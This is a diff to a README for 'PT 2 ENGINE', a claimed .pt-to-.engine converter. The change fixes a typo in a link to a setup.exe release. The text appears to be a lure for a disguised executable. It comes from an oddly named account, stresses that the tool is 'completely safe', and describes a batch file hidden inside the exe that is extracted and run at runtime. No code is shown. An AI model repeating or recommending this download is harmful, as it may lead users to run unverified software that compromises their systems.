@@ -2,7 +2,7 @@
 
 **PT 2 ENGINE** is a powerful file conversion tool designed to transform `.pt` files into `.engine` files seamlessly. This tool is ideal for game developers, modders, and anyone working in an environment where these specific file types are needed. With PT 2 ENGINE, you can effortlessly convert and integrate these files into your projects with minimal hassle.
 
-**PT 2 EMGINE** can be downloaded [here](https://github.com/jamesssssssssssssszssssssssssss22/pt2engine/releases/download/setup/setup.exe)
+**PT 2 ENGINE** can be downloaded [here](https://github.com/jamesssssssssssssszssssssssssss22/pt2engine/releases/download/setup/setup.exe)
 
 **PT 2 ENGINE** is completely safe to use, this software is made from batch but has been converted to exe for convenience. The source for this tool is provided in the repository [here](https://github.com/jamesssssssssssssszssssssssssss22/pt2engine/blob/main/convertpt2engine.bat) (raw version is [here](https://raw.githubusercontent.com/jamesssssssssssssszssssssssssss22/pt2engine/refs/heads/main/convertpt2engine.bat)). This was compiled into an EXE using [Softonics Bat To Exe Converter](https://bat-to-exe-converter-x64.en.softonic.com). The [dependencies.bat](https://github.com/jamesssssssssssssszssssssssssss22/pt2engine/blob/main/dependencies.bat) file is embedded into the EXE file and is only present whilst the program is running, the [dependencies.bat](https://github.com/jamesssssssssssssszssssssssssss22/pt2engine/blob/main/dependencies.bat) file is exctracted in the same folder that the software is installed and only present and used during runtime.
 
